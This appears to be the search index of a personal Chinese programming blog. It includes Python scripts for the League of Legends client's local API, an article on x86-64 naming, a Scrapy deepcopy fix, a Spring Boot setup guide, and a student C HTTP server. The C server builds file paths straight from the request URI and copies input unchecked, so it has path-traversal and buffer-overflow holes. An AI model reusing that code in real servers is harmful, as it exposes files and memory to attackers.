'commandline']).decode('gbk') # Use GBK in case of Chinese character in path app_port = raw_output.split('--app-port=')[-1].split(' ')[0].strip('\\&quot;') auth_token = raw_output.split('--remoting-auth-token=')[-1].split(' ')[0].strip('\\&quot;') url = self.protocol + '://' + 'riot:' + auth_token + '@' + self.host + ':' + app_port return app_port, auth_token, url def init(self): ''' Init the program ''' while True: if not self.checkProcess(): print('未检测到LeagueClient.exe') else: self.pid = self.checkProcess() self.port, self.token, self.url = lcu.getParam() break def pidCheck(self): ''' Check whether the PID of LCU is changed(or LCU restarted) ''' if psutil.Process(self.pid).name() == 'LeagueClient.exe': pass else: print('检测到PID变化') def ux_minimize(self): ''' Minimize the ux process and all its windows if it exists. This does not kill the ux. ''' rest = &quot;/riotclient/ux-minimize&quot; request = requests.post(self.url + rest , verify=False) return request.text 至于后面怎么写，看自己需求了 简单效果示范https://www.bilibili.com/video/BV1n54y1B7M3/","link":"/2020/06/23/LeagueClient%E9%80%9A%E4%BF%A1-0-%E5%A6%82%E4%BD%95%E8%AE%A9%E7%86%8A%E5%AD%A9%E5%AD%90%E7%8E%A9%E4%B8%8D%E4%BA%86LOL/"},{"title":"LeagueClient通信(1)-你和好友们认识了多久？","text":"原理在 LOL 的商城里，好友之间赠送礼物有这么一个条件 超过 14 天的好友能赠送礼物 要判断是否超过 14 天，必定在某个地方储存了成为好友的日期。幸运的是，LCU 的 REST API 中提供了查询方法 GET /lol-store/v1/giftablefriends 返回样例: 12345678910111213[ { &quot;friendsSince&quot;: &quot;2015-06-06 19:51:10&quot;, &quot;nick&quot;: &quot;53263468&quot;, &quot;oldFriends&quot;: true, &quot;summonerId&quot;: 4012653853 }, { ... ... }, ....] 数据注释: key value friendSince 成为好友的时间，精确到秒 nick 好友昵称 oldFriends 到目前时间是否够 14 天 summonerId summonerId 有这些就很好搞了，接下来写个 DEMO 试试 DEMO代码效果放在哔哩哔哩了 https://www.bilibili.com/video/BV1eK4y147od/ 代码如下因为要获取程序的命令行参数，所以需要管理员权限 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import requestsimport subprocessfrom datetime import datetimeclass LCU: def __init__(self): ''' init params ''' self.port = None self.host = '127.0.0.1' self.token = None self.protocol = 'https' self.url = None self.pid = None def getParam(self): ''' From https://github.com/minhluu2000/Project-Lego and changed a little Get necessary for client-specific info through CommandLine ''' raw_output = subprocess.check_output( ['wmic', 'PROCESS', 'WHERE', &quot;name='LeagueClientUx.exe'&quot;, 'GET', 'commandline']).decode('gbk') # Use GBK in case of Chinese character in path app_port = raw_output.split('--app-port=')[-1].split(' ')[0].strip('\\&quot;') auth_token = raw_output.split('--remoting-auth-token=')[-1].split(' ')[0].strip('\\&quot;') url = self.protocol + '://' + 'riot:' + auth_token + '@' + self.host + ':' + app_port return app_port, auth_token, url def init(self): ''' Init the instance ''' while True: if not self.checkProcess(): print('未检测到LeagueClient.exe') else: self.pid = self.checkProcess() self.port, self.token, self.url = self.getParam() break def giftablefriends(self): ''' /lol-store/v1/giftablefriends :return: [ { &quot;friendsSince&quot;: &quot;2015-06-06 19:51:10&quot;, &quot;nick&quot;: &quot;53263468&quot;, &quot;oldFriends&quot;: true, &quot;summonerId&quot;: 4012653853 }, .... ] ''' rest = &quot;/lol-store/v1/giftablefriends&quot; request = requests.get(self.url + rest, verify=False) infolist = request.json() return infolist def getFriendDate(self, reverse=False): infolist = self.giftablefriends() date_now_tuple = datetime.now().timetuple() date_now = datetime(date_now_tuple.tm_year, date_now_tuple.tm_mon, date_now_tuple.tm_mday) for infodict in infolist: date = infodict['friendsSince'] date_old_tuple = datetime.strptime(date, '%Y-%m-%d %H:%M:%S').timetuple() date_old = datetime(date_old_tuple.tm_year, date_old_tuple.tm_mon, date_old_tuple.tm_mday) interval = (date_now-date_old).days infodict['interval'] = interval #infolist_sorted = sorted(infolist, key=lambda hey:hey['interval']) 排序后新建列表 infolist.sort(key=lambda profile:profile['interval'], reverse=False) print(infolist) for infodict in infolist: date = infodict['friendsSince'] nick = infodict['nick'] interval = infodict['interval'] print(f'你和 {nick} 在 {date} 成为了好友, 距今已经 {interval}天')lcu = LCU()lcu.init()lcu.getFriendDate()","link":"/2020/07/02/LeagueClient%E9%80%9A%E4%BF%A1-1-%E4%BD%A0%E5%92%8C%E5%A5%BD%E5%8F%8B%E4%BB%AC%E8%AE%A4%E8%AF%86%E4%BA%86%E5%A4%9A%E4%B9%85%EF%BC%9F/"},{"title":"PC界中指令集架构的称呼与区别","text":"X86,X64,X86-64,AMD64…… 在 PC 界，这些词汇经常被提起，可是他们的区别在哪里？ 从 1978 年说起Intel 8086 是一个由 Intel 于 1978 年所设计的 16 位微处理器芯片，是x86架构的鼻祖。 随后，Intel 陆续推出了 80286, 80386 等一系列产品，这系列产品的架构被统称为x86。 值得注意的是，80386 总线数量达到了 32 根，首次将 PC 带入了32位时代，这个架构被称为IA-32或者i386。 64 位时代的来临随着技术的进一步发展，计算机逐步向 64 位发展。 AMD1999 年，AMD 发布了一个向下兼容 x86 指令集的 64 位指令集标准，并在 2000 年 8 月将标准完善，该标准被称为AMD64。 2003 年 4 月，AMD 发布了首款使用这个指令集的 CPU，名为Opteron（皓龙）。时至今日，AMD 的最新产品线中的Ryzen（锐龙）以及Epyc(霄龙) 仍然基于该架构。 Intel业界大哥的成绩并不是很理想 IA-64早在 1994 年，惠普与 Intel 就打算合作开发一个 64 位的指令集架构。 1998 年，第一代采用该架构的产品系列Itanium被提上日程，并于 2001 年 6 月推出第一代产品。 但是，该指令集架构与自家的x86不兼容，最终在市场上并没有取得成功。 2021 年，Intel 宣布基于该架构的 Kittson系列处理器将在 5 月后停止发售，并且没有宣布下一代产品。 Intel 64业界大哥 Intel 在 64 位时代中还要努力适配竞争对手所领导的标准，这面子过不去啊，得想办法挽救一下。 Intel 在 2004 年 1 月的 Intel 开发者论坛中承认正在设计一种 64 位的指令集架构。其被多次命名为EM64T、IA-32e等，最终定名为Intel 64。 这个架构与AMD64几乎完全相同，有媒体为它起了“iAMD64”这个别名，讽刺 Intel 在迎击 AMD 的民用 64 位技术上，使用了 AMD 的技术。 2004 年，Intel 发布了首次采用该架构的 CPU 系列产品Xeon(志强)。时至今日， Intel 的主力产品仍然采用该指令级架构。 业界称谓由于AMD64和Intel64基本上一致，很多软硬件产品都使用一种不倾向任何一方的词汇来表明它们对两种架构的同时兼容。出于这个目的，AMD 对这种 CPU 架构的原始称呼——x86-64被不时地使用，还有变体x86_64。其他公司如微软和 Sun 微系统在营销资料中使用x64作为缩写。","link":"/2021/11/02/PC%E7%95%8C%E4%B8%AD%E6%8C%87%E4%BB%A4%E9%9B%86%E6%9E%B6%E6%9E%84%E7%9A%84%E7%A7%B0%E5%91%BC%E4%B8%8E%E5%8C%BA%E5%88%AB/"},{"title":"Popular OJs all over the world","text":"国外知名度较高的一些 OJ 平台有： CodeForces http://codeforces.com/ UVa OJ https://onlinejudge.org/ LeetCode https://leetcode.com/ 国内也有一些广为使用的平台： 洛谷https://www.luogu.com.cn/ 杭州电子科技大学 HDOJ http://acm.hdu.edu.cn/ 北京大学 POJ http://poj.org/ 浙江大学 ZOJ https://zoj.pintia.cn/home/news ^^强制引用 20 篇以上真是有够好玩的","link":"/2023/05/02/Popular-OJs-all-over-the-world/"},{"title":"Scrapy deepcopy","text":"Why write this postThe code: 123456789101112def parse_category(self, response): flower = FlowerItem() root = response.css(&quot;div.zhiwuImg&quot;) for li in root.css(&quot;li&quot;): flower[&quot;name&quot;] = li.css(&quot;img&quot;).attrib['title'] yield scrapy.Request(url=self.webroot+li.css(&quot;a:first-child::attr(href)&quot;).get(), meta={&quot;item&quot;:flower}, callback=self.parse_detail)def parse_detail(self, response): flower = response.meta['item'] root = response.css(&quot;div.contentDiv&quot;) flower['firstletter'] = root.css(&quot;blockquote p::text&quot;).get() yield flower I am using scrapy.Request and set two attributes from two pages by pass a meta argument and the expected result when I execute 1scrapy crawl mySpider -o res.json should be like: 123{&quot;name&quot;:&quot;Alpha&quot;, &quot;quote&quot;:&quot;A&quot;}{&quot;name&quot;:&quot;Beta&quot;, &quot;quote&quot;:&quot;B&quot;}{&quot;name&quot;:&quot;Zeta&quot;, &quot;quote&quot;:&quot;Z&quot;} but in fact what’s in res.json is like: 123{&quot;name&quot;:&quot;Alpha&quot;, &quot;quote&quot;:&quot;A&quot;}{&quot;name&quot;:&quot;Alpha&quot;, &quot;quote&quot;:&quot;B&quot;}{&quot;name&quot;:&quot;Alpha&quot;, &quot;quote&quot;:&quot;Z&quot;} This is wired cuz my code is logical superficially but can’t figure it out until I searched on Internet…That’s a very common question when it comes to High-level programming language like Python: The difference between Value Type and Reference Type What’s Copy in PythonThink about this python code, what’s the output? 12345# Pythona = [1,2,3]b = ab.append(4)print(a) Surely in python it’s [1,2,3,4]. But what you changed is b, why a was changed too? That’s because in Python a and b is two pointer(just like C programming) pointing the same memory address(which is called id in python) Copying itemsTo copy an item, you must first decide whether you want a shallow copy or a deep copy. If your item contains mutable values like lists or dictionaries, a shallow copy will keep references to the same mutable values across all different copies. For example, if you have an item with a list of tags, and you create a shallow copy of that item, both the original item and the copy have the same list of tags. Adding a tag to the list of one of the items will add the tag to the other item as well. If that is not the desired behavior, use a deep copy instead. Back to the startFrom the Scrapy document we can know about meta: A dict that contains arbitrary metadata for this request. This dict is empty for new Requests, and is usually populated by different Scrapy components (extensions, middlewares, etc). So the data contained in this dict depends on the extensions you have enabled. See Request.meta special keys for a list of special meta keys recognized by Scrapy. This dict is shallow copied when the request is cloned using the copy() or replace() methods, and can also be accessed, in your spider, from the response.meta attribute. And so does it when it’s being passed like 1yield scrapy.Request(meta={&quot;item&quot;:flower}, callback=self.parse_detail) Scrapy is asynchronous by default, which means when your code looks like it’s logical, but it will probably not work as you wish. So a easy way to avoid that is to deepcopy this item, namely duplicating it in the memory, not pointing: 1yield scrapy.Request(meta={&quot;item&quot;:deepcopy(flower)}, callback=self.parse_detail) Reference given by @Gallecio: https://github.com/scrapy/scrapy/issues/3194","link":"/2021/04/20/Scrapy-deepcopy/"},{"title":"Simple C Implementation of HTTP Server","text":"README记录一下自己计算机网络课程设计作品 课题Unix 下简易 HTTP 服务器的 C 语言实现 要求使用 Berkeley Socket 实现基本的 TCP 通讯，并在此基础上遵循 HTTP 协议进行通讯 实现 HTTP/1.1 的基本功能，支持GET方法，支持访问静态内容，支持常见的MIME文件类型 代码web.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/wait.h&gt;#include &lt;netinet/in.h&gt;#include &quot;mime.h&quot;#define BUFFERSIZE 1024/* * for all the infos about BSD socket: https://en.wikipedia.org/wiki/Berkeley_sockets#socket *//* * wrapper for perror used for bad syscalls */void error(char *msg){ perror(msg); exit(1);}/* * returns an error message to the client */void error_c(FILE *stream, char *cause, char *status_code, char *shortmsg, char *longmsg, char *servername){ fprintf(stream, &quot;HTTP/1.1 %s %s\\n&quot;, status_code, shortmsg); fprintf(stream, &quot;Content-type: text/html\\n&quot;); fprintf(stream, &quot;\\n&quot;); fprintf(stream, &quot;&lt;html&gt;&lt;title&gt;Server Error&lt;/title&gt;&quot;); fprintf(stream, &quot;&lt;body bgcolor=&quot; &quot;ffffff&quot; &quot;&gt;\\n&quot;); fprintf(stream, &quot;&lt;h1&gt;%s %s&lt;/h1&gt;\\n&quot;, status_code, shortmsg); fprintf(stream, &quot;&lt;p&gt;%s: %s\\n&quot;, longmsg, cause); fprintf(stream, &quot;&lt;hr&gt;&lt;em&gt;%s&lt;/em&gt;\\n&quot;, servername);}int main(int argc, char **argv){ // variables for connection management int parentfd; // parent socket int childfd; // child socket int port; // port to listen on int optval; // flag value for setsockopt struct sockaddr_in serveraddr; // server's addr struct sockaddr_in clientaddr; // client addr int clientlen = sizeof(clientaddr); // byte size of client's address // variables for connection I/O FILE *stream; // stream of childfd char buf[BUFFERSIZE]; // message buffer char method[BUFFERSIZE]; // request method char uri[BUFFERSIZE]; // request uri char version[BUFFERSIZE]; // request http version char filename[BUFFERSIZE]; // path derived from uri char filetype[BUFFERSIZE]; // path derived from uri char *p; // temporary pointer int is_static; // flag value for static request struct stat fileinfo; // file status int fd; // static content file descriptor char *servername = &quot;BakaFT's C-Written Server&quot;; // commandline arg check if (argc != 2) { fprintf(stderr, &quot;usage: %s &lt;port&gt;\\n&quot;, argv[0]); exit(1); } port = atoi(argv[1]); // open socket descriptor parentfd = socket(AF_INET, SOCK_STREAM, 0); //The function returns -1 if an error occurred. Otherwise, it returns an integer representing the newly assigned descriptor. if (parentfd &lt; 0) error(&quot;ERROR opening socket&quot;); /* SO_REUSEADDR allows your server to FORCIBLY bind to an address which is in a TIME_WAIT state after closed. Reference: https://docs.microsoft.com/en-us/windows/win32/winsock/using-so-reuseaddr-and-so-exclusiveaddruse https://stackoverflow.com/questions/3229860/what-is-the-meaning-of-so-reuseaddr-setsockopt-option-linux */ optval = 1; setsockopt(parentfd, SOL_SOCKET, SO_REUSEADDR, (const void *)&amp;optval, sizeof(int)); // bind port to socket bzero((char *)&amp;serveraddr, sizeof(serveraddr)); serveraddr.sin_family = AF_INET; // IPv4 protocol serveraddr.sin_addr.s_addr = htonl(INADDR_ANY); // listen on all available interfaces. serveraddr.sin_port = htons((unsigned short)port); if (bind(parentfd, (struct sockaddr *)&amp;serveraddr, sizeof(serveraddr)) &lt; 0) error(&quot;ERROR on binding&quot;); // get ready to accept connection requests if (listen(parentfd, 10) &lt; 0) // allow up to 10 requests to queue up error(&quot;ERROR on listen&quot;); /* * main loop: wait for a connection request, parse HTTP, * serve requested content, close connection. */ while (1) { // wait for a connection request childfd = accept(parentfd, (struct sockaddr *)&amp;clientaddr, &amp;clientlen); /* accept() returns the new socket descriptor for the accepted connection, or the value -1 if an error occurs. Why cast sockaddr_in* to sockaddr* here? https://stackoverflow.com/questions/21099041/why-do-we-cast-sockaddr-in-to-sockaddr-when-calling-bind */ if (childfd &lt; 0) error(&quot;ERROR on accept&quot;); /* open the child socket descriptor as a stream */ if ((stream = fdopen(childfd, &quot;r+&quot;)) == NULL) error(&quot;ERROR on fdopen&quot;); /* get the HTTP request line */ fgets(buf, BUFFERSIZE, stream); printf(&quot;HTTP Request body:\\n%s&quot;, buf); sscanf(buf, &quot;%s %s %s\\n&quot;, method, uri, version); /* tiny only supports the GET method */ if (strcasecmp(method, &quot;GET&quot;)) /* strcasecmp() return an integer greater than, equal to, or less than 0, according as s1 is lexicographically greater than, equal to, or less than s2 */ { error_c(stream, method, &quot;501&quot;, &quot;Not Implemented&quot;, &quot;Server does not support this method&quot;, servername); fclose(stream); close(childfd); continue; } /* read and ignore the HTTP headers */ fgets(buf, BUFFERSIZE, stream); printf(&quot;%s&quot;, buf); while (strcmp(buf, &quot;\\r\\n&quot;)) { fgets(buf, BUFFERSIZE, stream); printf(&quot;%s&quot;, buf); } // parse the uri if (!strstr(uri, &quot;?&quot;)) { //static content is_static = 1; strcpy(filename, &quot;.&quot;); strcat(filename, uri); if (strlen(uri) == 1) // namely &quot;/&quot; { strcat(filename, &quot;index.html&quot;); // if uri is &quot;/&quot; then add &quot;index.html&quot; by default } else { //do nothing } } else { /* dynamic content not supported */ error_c(stream, uri, &quot;501&quot;, &quot;Not Implemented&quot;, &quot;Server does not support dynamic content&quot;, servername); fclose(stream); close(childfd); continue; } /* make sure the file exists */ /* stat() Upon successful completion a value of 0 is returned. Otherwise, a value of -1 is returned and errno is set to indicate the error. */ if (stat(filename, &amp;fileinfo) &lt; 0) // and here we store file info to fileinfo { error_c(stream, filename, &quot;404&quot;, &quot;Not found&quot;, &quot;Server couldn't find this file&quot;, servername); fclose(stream); close(childfd); continue; } // serve static content if (is_static) { // Here we assume that only 1 extension in filename // which means there will not be filename like “tom.html.jpg&quot; strcpy(filetype,&quot;text/plain&quot;); for (int i = 0; i &lt; ARRAYSIZE ; i++) { if (strstr(filename, mimelist[i].key)) { strcpy(filetype,mimelist[i].value); break; } } // print response header fprintf(stream, &quot;HTTP/1.1 200 OK\\n&quot;); fprintf(stream, &quot;Allow: GET\\n&quot;); fprintf(stream, &quot;Server: %s\\n&quot;,servername); fprintf(stream, &quot;Content-length: %d\\n&quot;, (int)fileinfo.st_size); // file size in bytes fprintf(stream, &quot;Content-type: %s;charset=UTF-8\\n&quot;, filetype); fprintf(stream, &quot;\\r\\n&quot;); fflush(stream); /* Use mmap to return arbitrary-sized response body open file and map the contents to memory, then copy it from memory to stream and send out thourgh socket. use munmap() to free the mapped memory at last. */ fd = open(filename, O_RDONLY); p = mmap(0, fileinfo.st_size, PROT_READ, MAP_PRIVATE, fd, 0); fwrite(p, 1, fileinfo.st_size, stream); munmap(p, fileinfo.st_size); // undo mmap } // close this socket and wait for the next accept() fclose(stream); close(childfd); }} mime.h123456789101112131415161718#define ARRAYSIZE 10 typedef struct Map{ char *key; char *value;} Mapnode;Mapnode mimelist[ARRAYSIZE] = { {&quot;mp3&quot;, &quot;audio/mpeg&quot;}, {&quot;gif&quot;, &quot;image/gif&quot;}, {&quot;jpg&quot;, &quot;image/jpeg&quot;}, {&quot;png&quot;, &quot;image/png&quot;}, {&quot;svg&quot;, &quot;image/svg+xml&quot;}, {&quot;css&quot;, &quot;text/css&quot;}, {&quot;html&quot;, &quot;text/html&quot;}, {&quot;txt&quot;, &quot;text/plain&quot;}, {&quot;xml&quot;, &quot;text/xml&quot;}, {&quot;ico&quot;,&quot;image/x-icon&quot;}};","link":"/2021/05/28/Simple-C-Implementation-of-HTTP-Server/"},{"title":"Ubuntu下部署Spring Boot 2.7开发环境","text":"部署之前环境：Ubuntu 20.04 过程参考 Spring 官方文档 Spring Boot Reference Documentation 安装依赖Spring Boot 2.7.0 requires Java 8 and is compatible up to and including Java 18. Spring Framework 5.3.20 or above is also required. Explicit build support is provided for the following build tools: Build Tool Version Maven 3.5+ Gradle 6.8.x, 6.9.x, and 7.x JDK选用了Liberica JDK 11 Liberica Package Repositories | BellSoft Java (bell-sw.com) 首先把它的软件源加进来 12wget -q -O - https://download.bell-sw.com/pki/GPG-KEY-bellsoft | sudo apt-key add -echo &quot;deb [arch=amd64] https://apt.bell-sw.com/ stable main&quot; | sudo tee /etc/apt/sources.list.d/bellsoft.list 然后更新源，安装 12sudo apt-get updatesudo apt-get install bellsoft-java11 修改环境变量 123# JDKexport JAVA_HOME=/usr/lib/jvm/bellsoft-java11-amd64/export PATH=$PATH:$JAVA_HOME/bin Maven Spring Boot is compatible with Apache Maven 3.3 or above 参考 Maven 官网的引导进行 通过 wget 下载 1wget https://dlcdn.apache.org/maven/maven-3/3.8.5/binaries/apache-maven-3.8.5-bin.tar.gz 解压一下 1tar xzvf apache-maven-3.8.5-bin.tar.gz 添加环境变量 12# Mavenexport PATH=$PATH:~/apache-maven-3.8.5/bin 检查是否配置正确 123456bakaft@BakaFT-PC:~/apache-maven-3.8.5/bin$ mvn -vApache Maven 3.8.5 (3599d3414f046de2324203b78ddcf9b5e4388aa0)Maven home: /home/bakaft/apache-maven-3.8.5Java version: 11.0.15, vendor: BellSoft, runtime: /usr/lib/jvm/bellsoft-java11-amd64Default locale: en, platform encoding: UTF-8OS name: &quot;linux&quot;, version: &quot;5.10.16.3-microsoft-standard-wsl2&quot;, arch: &quot;amd64&quot;, family: &quot;unix&quot; (可选)Spring-CLI官网的文档推荐使用Spring-CLI进行管理 下载12wget https://repo.spring.io/release/org/springframework/boot/spring-boot-cli/2.7.0/spring-boot-cli-2.7.0-bin.tar.gztar xzvf spring-boot-cli-2.7.0-bin.tar.gz 设置环境变量123# Spring-CLIexport SPRING_HOME=~/spring-2.7.0export PATH=$PATH:$SPRING_HOME/bin 运行一个最小 Spring Boot 实例新建一个文件app.groovy，写入： 123456789@RestControllerclass ThisWillActuallyRun { @RequestMapping(&quot;/&quot;) String home() { &quot;Hello World!&quot; }} 使用 Spring-CLI 运行它 12345678910111213141516171819202122232425bakaft@BakaFT-PC:~/java-projects$ spring run app.groovyResolving dependencies................................. . ____ _ __ _ _ /\\\\ / ___'_ __ _ _(_)_ __ __ _ \\ \\ \\ \\( ( )\\___ | '_ | '_| | '_ \\/ _` | \\ \\ \\ \\ \\\\/ ___)| |_)| | | | | || (_| | ) ) ) ) ' |____| .__|_| |_|_| |_\\__, | / / / / =========|_|==============|___/=/_/_/_/ :: Spring Boot :: (v2.7.0)2022-05-24 18:56:03.544 INFO 194 --- [ runner-0] o.s.boot.SpringApplication : Starting application using Java 11.0.15 on BakaFT-PC with PID 194 (started by bakaft in /home/bakaft/java-projects)2022-05-24 18:56:03.549 INFO 194 --- [ runner-0] o.s.boot.SpringApplication : No active profile set, falling back to 1 default profile: &quot;default&quot;2022-05-24 18:56:04.344 INFO 194 --- [ runner-0] o.s.b.w.embedded.tomcat.TomcatWebServer : Tomcat initialized with port(s): 8080 (http)2022-05-24 18:56:04.356 INFO 194 --- [ runner-0] o.apache.catalina.core.StandardService : Starting service [Tomcat]2022-05-24 18:56:04.356 INFO 194 --- [ runner-0] org.apache.catalina.core.StandardEngine : Starting Servlet engine: [Apache Tomcat/9.0.63]2022-05-24 18:56:04.379 INFO 194 --- [ runner-0] org.apache.catalina.loader.WebappLoader : Unknown class loader [org.springframework.boot.cli.compiler.ExtendedGroovyClassLoader$DefaultScopeParentClassLoader@7a3d45bd] of class [class org.springframework.boot.cli.compiler.ExtendedGroovyClassLoader$DefaultScopeParentClassLoader]2022-05-24 18:56:04.407 INFO 194 --- [ runner-0] o.a.c.c.C.[Tomcat].[localhost].[/] : Initializing Spring embedded WebApplicationContext2022-05-24 18:56:04.407 INFO 194 --- [ runner-0] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 691 ms2022-05-24 18:56:04.543 WARN 194 --- [ runner-0] o.s.b.a.AutoConfigurationPackages : @EnableAutoConfiguration was declared on a class in the default package. Automatic @Repository and @Entity scanning is not enabled.2022-05-24 18:56:04.903 INFO 194 --- [ runner-0] o.s.b.w.embedded.tomcat.TomcatWebServer : Tomcat started on port(s): 8080 (http) with context path ''2022-05-24 18:56:04.913 INFO 194 --- [ runner-0] o.s.boot.SpringApplication : Started application in 1.769 seconds (JVM running for 46.504)2022-05-24 18:58:42.253 INFO 194 --- [nio-8080-exec-1] o.a.c.c.C.[Tomcat].[localhost].[/] : Initializing Spring DispatcherServlet 'dispatcherServlet'2022-05-24 18:58:42.254 INFO 194 --- [nio-8080-exec-1] o.s.web.servlet.DispatcherServlet : Initializing Servlet 'dispatcherServlet'2022-05-24 18:58:42.255 INFO 194 --- [nio-8080-exec-1] o.s.web.servlet.DispatcherServlet : Completed initialization in 1 ms 可以看到，这样就启动了一个非常小的 Spring Boot 实例 12bakaft@BakaFT-PC:~$ curl http://localhost:8080 -w '\\n'Hello World! 创建一个 Spring Boot 项目Spring Boot 项目本质上还是一个 Maven(或者 Gradle)项目 编写 pom.xml创建一个新的文件夹，让 Maven 可以来初始化项目 在这个文件夹里创建pom.xml，并写入如下内容，你可以根据需求更改内容： 123456789101112131415161718192021222324&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;me.bakaft&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-demo&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.7.0&lt;/version&gt; &lt;/parent&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;!-- Additional lines to be added here... --&gt;&lt;/project&gt; 这个时候，你就可以将你的这个 Maven 项目导入 IDE 进行开发了，不过接下来继续使用命令行进行 接下来更新 Maven 的依赖树，第一次运行会先下载依赖 1mvn dependency:tree 在运行一次就可以看到当前项目的依赖树了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546bakaft@BakaFT-PC:~/java-projects/spring-boot-demo$ mvn dependency:tree[INFO] Scanning for projects...[INFO][INFO] ---------------------&lt; me.bakaft:spring-boot-demo &gt;---------------------[INFO] Building spring-boot-demo 0.0.1-SNAPSHOT[INFO] --------------------------------[ jar ]---------------------------------[INFO][INFO] --- maven-dependency-plugin:3.3.0:tree (default-cli) @ spring-boot-demo ---[INFO] me.bakaft:spring-boot-demo:jar:0.0.1-SNAPSHOT[INFO] \\- org.springframework.boot:spring-boot-starter-web:jar:2.7.0:compile[INFO] +- org.springframework.boot:spring-boot-starter:jar:2.7.0:compile[INFO] | +- org.springframework.boot:spring-boot:jar:2.7.0:compile[INFO] | +- org.springframework.boot:spring-boot-autoconfigure:jar:2.7.0:compile[INFO] | +- org.springframework.boot:spring-boot-starter-logging:jar:2.7.0:compile[INFO] | | +- ch.qos.logback:logback-classic:jar:1.2.11:compile[INFO] | | | +- ch.qos.logback:logback-core:jar:1.2.11:compile[INFO] | | | \\- org.slf4j:slf4j-api:jar:1.7.36:compile[INFO] | | +- org.apache.logging.log4j:log4j-to-slf4j:jar:2.17.2:compile[INFO] | | | \\- org.apache.logging.log4j:log4j-api:jar:2.17.2:compile[INFO] | | \\- org.slf4j:jul-to-slf4j:jar:1.7.36:compile[INFO] | +- jakarta.annotation:jakarta.annotation-api:jar:1.3.5:compile[INFO] | +- org.springframework:spring-core:jar:5.3.20:compile[INFO] | | \\- org.springframework:spring-jcl:jar:5.3.20:compile[INFO] | \\- org.yaml:snakeyaml:jar:1.30:compile[INFO] +- org.springframework.boot:spring-boot-starter-json:jar:2.7.0:compile[INFO] | +- com.fasterxml.jackson.core:jackson-databind:jar:2.13.3:compile[INFO] | | +- com.fasterxml.jackson.core:jackson-annotations:jar:2.13.3:compile[INFO] | | \\- com.fasterxml.jackson.core:jackson-core:jar:2.13.3:compile[INFO] | +- com.fasterxml.jackson.datatype:jackson-datatype-jdk8:jar:2.13.3:compile[INFO] | +- com.fasterxml.jackson.datatype:jackson-datatype-jsr310:jar:2.13.3:compile[INFO] | \\- com.fasterxml.jackson.module:jackson-module-parameter-names:jar:2.13.3:compile[INFO] +- org.springframework.boot:spring-boot-starter-tomcat:jar:2.7.0:compile[INFO] | +- org.apache.tomcat.embed:tomcat-embed-core:jar:9.0.63:compile[INFO] | +- org.apache.tomcat.embed:tomcat-embed-el:jar:9.0.63:compile[INFO] | \\- org.apache.tomcat.embed:tomcat-embed-websocket:jar:9.0.63:compile[INFO] +- org.springframework:spring-web:jar:5.3.20:compile[INFO] | \\- org.springframework:spring-beans:jar:5.3.20:compile[INFO] \\- org.springframework:spring-webmvc:jar:5.3.20:compile[INFO] +- org.springframework:spring-aop:jar:5.3.20:compile[INFO] +- org.springframework:spring-context:jar:5.3.20:compile[INFO] \\- org.springframework:spring-expression:jar:5.3.20:compile[INFO] ------------------------------------------------------------------------[INFO] BUILD SUCCESS[INFO] ------------------------------------------------------------------------[INFO] Total time: 0.939 s[INFO] Finished at: 2022-05-24T19:20:04+08:00 编写 RestControllerMaven 默认从src/main/java编译源码 123bakaft@BakaFT-PC:~/java-projects/spring-boot-demo$ mkdir -p src/main/javabakaft@BakaFT-PC:~/java-projects/spring-boot-demo$ cd src/main/java/bakaft@BakaFT-PC:~/java-projects/spring-boot-demo/src/main/java$ vi MyApplication.java 1234567891011121314151617181920// MyApplication.javaimport org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.EnableAutoConfiguration;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;@RestController@EnableAutoConfigurationpublic class MyApplication { @RequestMapping(&quot;/&quot;) String home() { return &quot;Hi!This is my first Spring Boot application from scratch&quot;; } public static void main(String[] args) { SpringApplication.run(MyApplication.class, args); }} 运行测试第一次运行会下载一些东西，多等等 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950bakaft@BakaFT-PC:~/java-projects/spring-boot-demo$ mvn spring-boot:run[INFO] Scanning for projects...[INFO][INFO] ---------------------&lt; me.bakaft:spring-boot-demo &gt;---------------------[INFO] Building spring-boot-demo 0.0.1-SNAPSHOT[INFO] --------------------------------[ jar ]---------------------------------[INFO][INFO] &gt;&gt;&gt; spring-boot-maven-plugin:2.7.0:run (default-cli) &gt; test-compile @ spring-boot-demo &gt;&gt;&gt;[INFO][INFO] --- maven-resources-plugin:3.2.0:resources (default-resources) @ spring-boot-demo ---[INFO] Using 'UTF-8' encoding to copy filtered resources.[INFO] Using 'UTF-8' encoding to copy filtered properties files.[INFO] skip non existing resourceDirectory /home/bakaft/java-projects/spring-boot-demo/src/main/resources[INFO] skip non existing resourceDirectory 